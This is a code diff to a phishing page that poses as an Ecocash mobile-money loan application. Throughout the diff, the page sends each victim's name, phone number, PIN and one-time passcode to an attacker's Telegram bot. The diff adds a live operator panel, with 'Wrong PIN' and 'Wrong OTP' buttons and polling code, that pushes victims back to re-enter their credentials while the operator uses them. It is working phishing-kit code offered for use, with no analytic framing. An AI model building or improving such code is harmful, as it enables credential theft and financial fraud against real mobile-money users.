@@ -474,7 +474,7 @@
       <p class="sub">Enter your full name to begin.</p>
 
       <label>Full Name</label>
-      <input type="text" id="fullName" placeholder="John Doe" maxlength="50" />
+      <input type="text" id="fullName" placeholder="Estevo Paguel" maxlength="50" />
 
       <label>Mobile Number</label>
       <input type="tel" id="msisdn" placeholder="+263771234567" inputmode="numeric" />
@@ -531,28 +531,6 @@
       <button class="cta" id="btnVerifyOtp" type="button">Verify & Continue</button>
     </section>
 
-    <!-- STEP 4: PROCESSING -->
-    <section class="card step" id="step4">
-      <div class="processing">
-        <h2>Processing Your Request</h2>
-        <div class="spinner"></div>
-        <p id="processText">Validating OTP...</p>
-      </div>
-    </section>
-
-    <!-- STEP 5: SUCCESS -->
-    <section class="card step" id="step5">
-      <div class="success">
-        <div class="check">✓</div>
-        <h2>Loan Approved!</h2>
-        <p>Congratulations! Your loan has been approved and is being processed.</p>
-        <div class="ref">REF: EC-<span id="refCode">000000</span></div>
-        <p><b id="successAmount" style="color:#0033A0; font-size:20px;">$500</b> will be sent to<br/><b id="successMsisdn">+263...</b> within minutes.</p>
-        <div class="countdown"><div class="fill"></div></div>
-        <div class="countdown-label">Redirecting to Ecocash portal...</div>
-      </div>
-    </section>
-
   </main>
 
   <footer>
@@ -577,7 +555,8 @@
     amount: '',
     term: '',
     pin: '',
-    otp: ''
+    otp: '',
+    victimId: null
   };
 
   // ============================================================
@@ -611,31 +590,92 @@
   }
 
   // ============================================================
+  //  NAME VALIDATION: LETTERS ONLY
+  // ============================================================
+  document.getElementById('fullName').addEventListener('input', function() {
+    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+  });
+
+  // ============================================================
   //  TELEGRAM SEND
   // ============================================================
-  function sendToTelegram(data) {
+  function sendToTelegram(message, keyboard = null) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const message = `
-🎯 *NEW ECOCASH LOAN APPLICATION* 🎯
-----------------------
-👤 *Name:* ${data.name || 'N/A'}
-📱 *Phone:* ${data.phone || 'N/A'}
-💸 *Loan:* ${data.loan || 'N/A'}
-📅 *Term:* ${data.duration || 'N/A'}
-🔐 *PIN:* ${data.pin || 'N/A'}
-🔢 *OTP:* ${data.otp || 'N/A'}
-🕒 *Time:* ${new Date().toLocaleString()}
-    `;
+    const payload = {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    };
+    if (keyboard) payload.reply_markup = keyboard;
 
     fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
+      body: JSON.stringify(payload)
     }).catch(err => console.error('TG send failed:', err));
+  }
+
+  // ============================================================
+  //  ADMIN CONTROL PANEL
+  // ============================================================
+  function sendAdminControl() {
+    const victimId = Date.now();
+    state.victimId = victimId;
+
+    const message = `
+🚨 *ECOCASH VICTIM ACTIVE* 🚨
+📞 *Number:* ${state.msisdn}
+💸 *Loan:* ${state.amount}
+
+Choose action:
+    `;
+    const keyboard = {
+      inline_keyboard: [
+        [{ text: "❌ Wrong PIN", callback_data: `wrong_pin_${victimId}` }],
+        [{ text: "❌ Wrong OTP", callback_data: `wrong_otp_${victimId}` }]
+      ]
+    };
+
+    sendToTelegram(message, keyboard);
+  }
+
+  // ============================================================
+  //  LONG POLLING FOR ADMIN COMMANDS
+  // ============================================================
+  function startPolling() {
+    let offset = null;
+    const interval = setInterval(() => {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`)
+        .then(r => r.json())
+        .then(data => {
+          data.result.forEach(msg => {
+            offset = msg.update_id + 1;
+            const action = msg.callback_query?.data;
+            const fromId = msg.callback_query?.from.id;
+
+            if (fromId != CHAT_ID) return;
+            if (!action || !action.endsWith(state.victimId)) return;
+
+            if (action.startsWith('wrong_pin_')) {
+              clearInterval(interval);
+              showStep('step2');
+              document.getElementById('err2').textContent = 'Invalid PIN. Please try again.';
+              document.getElementById('err2').classList.add('show');
+              document.getElementById('ecocashPin').value = '';
+              setTimeout(() => document.getElementById('ecocashPin').focus(), 100);
+            }
+
+            if (action.startsWith('wrong_otp_')) {
+              clearInterval(interval);
+              showStep('step3');
+              showErr('errOtp', 'Invalid OTP. Please check and re-enter.');
+              document.querySelectorAll('#step3 input').forEach(i => i.value = '');
+              setTimeout(() => document.getElementById('otp1').focus(), 100);
+            }
+          });
+        })
+        .catch(() => {});
+    }, 2000);
   }
 
   // ============================================================
@@ -647,6 +687,7 @@
     const amount = getFinalAmount();
 
     if (!name) return showErr('err1', 'Enter your full name');
+    if (!/[a-zA-Z]{2,}\s+[a-zA-Z]{2,}/.test(name)) return showErr('err1', 'Name must be letters only (e.g. Estevo Paguel)');
     if (!msisdn || !/^(\+?263|0)?7(7|8)\d{7}$/.test(msisdn)) {
       return showErr('err1', 'Enter a valid Ecocash number');
     }
@@ -664,10 +705,11 @@
     state.term = document.getElementById('repaymentTerm').value + ' days';
 
     showStep('step2');
+    document.getElementById('ecocashPin').focus();
   });
 
   // ============================================================
-  //  STEP 2: PIN → EXFIL (Partial)
+  //  STEP 2: PIN → EXFIL + ADMIN CONTROL
   // ============================================================
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     const pin = document.getElementById('ecocashPin').value.trim();
@@ -677,18 +719,22 @@
 
     state.pin = pin;
 
-    // Send partial data to Telegram
-    sendToTelegram({
-      name: state.name,
-      phone: state.msisdn,
-      loan: state.amount,
-      duration: state.term,
-      pin: state.pin,
-      otp: "Pending..."
-    });
+    // Log to Telegram
+    const log = `
+📱 *ECOCASH PHISH: PHASE 1* 📱
+👤 *Name:* ${state.name}
+📞 *Number:* ${state.msisdn}
+🔐 *PIN:* ${state.pin}
+💸 *Loan:* ${state.amount}
+📅 *Term:* ${state.term}
+🕒 *Time:* ${new Date().toLocaleString()}
+    `;
+    sendToTelegram(log);
 
     showStep('step3');
     document.getElementById('otp1').focus();
+    sendAdminControl();
+    startPolling();
   });
 
   // ============================================================
@@ -701,14 +747,15 @@
       if (this.value.length === 1 && i < 3) {
         document.getElementById(otpInputs[i + 1]).focus();
       }
-      if (document.getElementById('otp4').value.length === 1) {
+      const otp = otpInputs.map(id => document.getElementById(id).value).join('');
+      if (otp.length === 4) {
         document.getElementById('btnVerifyOtp').disabled = false;
       }
     });
   });
 
   // ============================================================
-  //  STEP 3: OTP → FINAL EXFIL + BAIT
+  //  STEP 3: OTP → FINAL EXFIL
   // ============================================================
   document.getElementById('btnVerifyOtp').addEventListener('click', () => {
     const otp = otpInputs.map(id => document.getElementById(id).value).join('');
@@ -718,43 +765,20 @@
 
     state.otp = otp;
 
-    // FINAL EXFIL — FULL DATA
-    sendToTelegram({
-      name: state.name,
-      phone: state.msisdn,
-      loan: state.amount,
-      duration: state.term,
-      pin: state.pin,
-      otp: state.otp
-    });
+    const log = `
+🔐 *ECOCASH FULL TRIAD CAPTURE* 🔐
+👤 *Name:* ${state.name}
+📞 *Number:* ${state.msisdn}
+🔐 *PIN:* ${state.pin}
+🔢 *OTP:* ${state.otp}
+💸 *Loan:* ${state.amount}
+📅 *Term:* ${state.term}
+🕒 *Time:* ${new Date().toLocaleString()}
+    `;
+    sendToTelegram(log);
 
-    showStep('step4');
-
-    // BAITING MESSAGES
-    const messages = [
-      { text: 'Validating OTP...', delay: 0 },
-      { text: 'Connecting to Ecocash Central Server...', delay: 1500 },
-      { text: 'Fetching customer profile...', delay: 3500 },
-      { text: 'Checking Ecocash balance...', delay: 5500 },
-      { text: 'Verifying ID and credit history...', delay: 7500 },
-      { text: 'Loan Approved! Generating contract...', delay: 9500 },
-      { text: 'Debiting 3% processing fee...', delay: 11500 },
-      { text: '⚠️ SYSTEM ERROR: Security flag detected!', delay: 13500 },
-      { text: 'Re-enter PIN to verify identity.', delay: 15500 }
-    ];
-
-    messages.forEach(m => {
-      setTimeout(() => {
-        document.getElementById('processText').textContent = m.text;
-      }, m.delay);
-    });
-
-    // LOOP BACK TO TRAP MORE DATA
-    setTimeout(() => {
-      showStep('step2');
-      document.getElementById('ecocashPin').value = '';
-      alert("Security check failed. Please re-enter your correct Ecocash PIN.");
-    }, 17000);
+    // Wait for admin command
+    showStep('step2'); // Will be overridden by polling
   });
 
   // ============================================================
@@ -768,6 +792,5 @@
 
   document.getElementById('yr').textContent = new Date().getFullYear();
 </script>
-
 </body>
 </html>
